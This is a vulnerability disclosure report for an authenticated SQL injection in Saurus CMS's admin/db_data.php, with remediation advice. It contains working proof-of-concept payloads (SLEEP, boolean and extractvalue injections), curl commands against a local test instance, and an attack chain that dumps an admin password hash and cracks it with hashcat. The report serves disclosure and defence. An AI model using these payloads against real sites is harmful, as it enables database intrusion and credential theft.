# Vulnerability Report — SQL Injection in `admin/db_data.php`
**Saurus CMS Community Edition — All versions ≤ commit `d886e5b`**

---

## 1. Summary

| Field | Value |
|---|---|
| **Vulnerability** | SQL Injection (SHOW-statement injection) |
| **File** | `admin/db_data.php` line 509 |
| **Parameter** | `table_name` (GET or POST) |
| **CWE** | CWE-89: Improper Neutralization of Special Elements used in an SQL Command |
| **CVSS v3.1 Score** | **7.2 HIGH** |
| **CVSS Vector** | `AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` |
| **Authentication** | Required — CMS admin credentials |
| **Affected versions** | All (no fix as of latest commit) |
| **Confirmed live** | Yes — SLEEP(3) fired (3109 ms), table traversal confirmed |

---

## 2. What Kind of SQL Injection Is This?

The injection point is inside a MySQL **`SHOW COLUMNS FROM`** statement — not a `SELECT`, `INSERT`, or `UPDATE`. This gives it a distinct attack surface compared to classic SQL injection.

```
SHOW COLUMNS FROM [USER-CONTROLLED INPUT]
```

Because of this context, three out of the four standard SQLi families are available, and one is blocked:

| Technique | Available? | Mechanism |
|---|---|---|
| **Table Traversal** (direct info disclosure) | ✓ Yes | Supply any table/schema name — columns are printed directly to the response |
| **Time-based Blind** | ✓ Yes | `WHERE (SELECT 1 FROM (SELECT SLEEP(N))x)` — MySQL evaluates the subquery |
| **Boolean-based Blind** | ✓ Yes | `WHERE Field='col' AND 1=1` vs `AND 1=2` — different row counts returned |
| **Error-based** | ✓ Partial | `WHERE extractvalue(1,concat(0x7e,version()))` — works if `display_errors=On` |
| **UNION-based** | ✗ No | `SHOW` statements do not support `UNION` |
| **Stacked queries** | ✗ No | PHP's `mysql_query()` does not execute multiple statements |

### Why SHOW Injection Is Dangerous Despite No UNION

UNION is the "fastest" SQLi technique but it is not required for impact. With table traversal alone an attacker can:
- Enumerate every column name and data type in every table in the database
- Access MySQL system tables (`information_schema.user_privileges`, `information_schema.columns`, etc.)
- Map out the full schema before pivoting to a second injection (e.g., the confirmed `edit_object.php` UNION injection)

With blind techniques added, full data extraction from any table is achievable character by character.

---

## 3. Vulnerable Code

**`admin/db_data.php` line 509:**

```php
$sql = "SHOW COLUMNS FROM ".$site->fdat['table_name'];
$sth = new SQL($sql);
```

`$site->fdat` is a wrapper that merges `$_GET` and `$_POST`. The `table_name` value is taken from the HTTP request and concatenated directly into the SQL string with **zero sanitisation, escaping, or whitelisting**.

The `DB::prepare()` mechanism (the CMS's own parameterised-query helper) is not used here. It would have been the correct fix.

---

## 4. Proof of Concept

### Prerequisites
```
Docker running: docker compose up -d
CMS at: http://localhost:9080
Admin login: admin / Admin1234!
```

### 4.1 — Table Traversal (In-Band, Direct Disclosure)

Read the column structure of the `users` table — including the `password` column — without any blind technique:

**Request:**
```
GET /admin/db_data.php?table_name=users HTTP/1.1
Host: localhost:9080
Cookie: PHPSESSID=<admin_session>
```

**Result (confirmed live):**
```
Field          Type      Null  Key   Default  Extra
user_id        int(11)   NO    PRI   -        auto_increment
group_id       int(11)   NO    MUL   -
email          varchar   YES   MUL   -
password       varchar   NO    -     -
username       varchar   NO    UNI   -
firstname      varchar   YES   -     -
...
```
The column name `password` is now known. Combined with any second SQLi (e.g., `edit_object.php`), data can be extracted.

**curl:**
```bash
curl -s -b cookies.txt \
  "http://localhost:9080/admin/db_data.php?table_name=users" | \
  grep -oE "<td width=\"20%\">[^<]+</td>" | head -20
```

---

### 4.2 — MySQL Privilege Disclosure (information_schema)

Read the structure of `information_schema.user_privileges` — reveals what database accounts exist and what they can do:

**Request:**
```
GET /admin/db_data.php?table_name=information_schema.user_privileges
```

**Result (confirmed live):**
```
Field           Type
GRANTEE         varchar(81)    NO
TABLE_CATALOG   varchar(512)   NO
PRIVILEGE_TYPE  varchar(64)    NO
IS_GRANTABLE    varchar(3)     NO
```

**curl:**
```bash
curl -s -b cookies.txt \
  "http://localhost:9080/admin/db_data.php?table_name=information_schema.user_privileges"
```

---

### 4.3 — Time-Based Blind SQLi (Confirmed)

Proves arbitrary SQL executes inside the injection point. Response is delayed by exactly `SLEEP(N)` seconds:

**Payload:**
```
table_name=users WHERE (SELECT 1 FROM (SELECT SLEEP(3))x)
```

**Generates:**
```sql
SHOW COLUMNS FROM users WHERE (SELECT 1 FROM (SELECT SLEEP(3))x)
```

**Result:** Response time = **3109 ms** (baseline ~50 ms) — SLEEP(3) executed ✓

**curl:**
```bash
curl -s -b cookies.txt \
  --data-urlencode "table_name=users WHERE (SELECT 1 FROM (SELECT SLEEP(3))x)" \
  -G "http://localhost:9080/admin/db_data.php"
```

---

### 4.4 — Boolean-Based Blind SQLi (Confirmed)

Different number of rows returned depending on truth value of injected condition — enables character-by-character data extraction:

| Payload | Rows returned |
|---|---|
| `users WHERE Field='user_id' AND 1=1` (true) | **14 rows** |
| `users WHERE Field='user_id' AND 1=2` (false) | **7 rows** |

The row-count difference confirms the WHERE clause is evaluated — a full blind extraction loop can be built on this.

---

### 4.5 — Error-Based (With `display_errors = On`)

Forces MySQL to embed data inside an XPATH error message returned in the HTTP response:

**Payload:**
```
table_name=users WHERE extractvalue(1,concat(0x7e,version()))
```
**Generates:**
```sql
SHOW COLUMNS FROM users WHERE extractvalue(1,concat(0x7e,version()))
```
**Expected error output (when `display_errors` is On):**
```
XPATH syntax error: '~10.6.x-MariaDB'
```

---

## 5. Attack Chain — Schema Mapping → Credential Extraction

The `db_data.php` injection alone cannot dump table rows (SHOW COLUMNS returns column metadata, not row data). The practical attack chain is:

```
Step 1 [db_data.php]  → table_name=users
                         → Learn: columns are user_id, username, password, email, group_id

Step 2 [edit_object.php] → tyyp_idlist=0) UNION SELECT username,password,3,4,5,6,7,8,9,10
                            FROM users LIMIT 1-- -
                         → Dump: admin:KGRbQ.XG7ojrw (DES-crypt hash, crackable offline)

Step 3 [offline]      → hashcat -m 1500 KGRbQ.XG7ojrw wordlist.txt
                         → Recover plaintext password
```

Both injections are authenticated (admin-only), but this chain is realistic if an admin account is compromised via CSRF (Vuln 6) or phishing.

---

## 6. Impact

| Impact Category | Detail |
|---|---|
| **Confidentiality** | Full database schema exposure; combined with second injection → full data dump |
| **Integrity** | Time/boolean blind techniques can be used to trigger DB-side state changes via subqueries |
| **Availability** | `SLEEP()` injection can tie up DB connections; heavy blind extraction loops can DoS the DB server |

---

## 7. Root Cause

```php
// VULNERABLE (db_data.php:509)
$sql = "SHOW COLUMNS FROM ".$site->fdat['table_name'];

// The CMS has its own parameterised-query helper but it is not used here.
// DB::prepare() escapes and quotes values when ? placeholders are present.
// SHOW COLUMNS does not support ? placeholders, so a whitelist is required instead.
```

---

## 8. Remediation

**Recommended fix — validate against a whitelist of allowed tables:**

```php
// Get the list of tables actually in the database
$allowed_tables = array();
$sth_tables = new SQL("SHOW TABLES");
while ($row = $sth_tables->fetchrow()) {
    $allowed_tables[] = $row[0];
}

$table_name = $site->fdat['table_name'];

if (!in_array($table_name, $allowed_tables)) {
    // Table not in DB — reject immediately
    die("Invalid table name.");
}

// Safe: table_name is now guaranteed to be a real table in this database
$sql = "SHOW COLUMNS FROM `" . $table_name . "`";
```

This prevents cross-database traversal (`information_schema.*`) and eliminates injection via the WHERE clause.

**Secondary hardening:**
- Restrict access to `db_data.php` to superadmin group only (currently any admin)
- Consider removing the feature entirely in production deployments (exposing raw DB structure to any admin is itself a security weakness)

---

## 9. References

| Reference | Link |
|---|---|
| CWE-89 | https://cwe.mitre.org/data/definitions/89.html |
| OWASP SQL Injection | https://owasp.org/www-community/attacks/SQL_Injection |
| CVSS Calculator | https://www.first.org/cvss/calculator/3.1 |
| Compliance | In compliance with Sections 4.2 and 5.3 of the CVE Entry Reference Requirement rules, and after having provided a period of 108 days for an attempt at coordinated vulnerability disclosure from the vendor, this finding is being officially made public.

 |
---

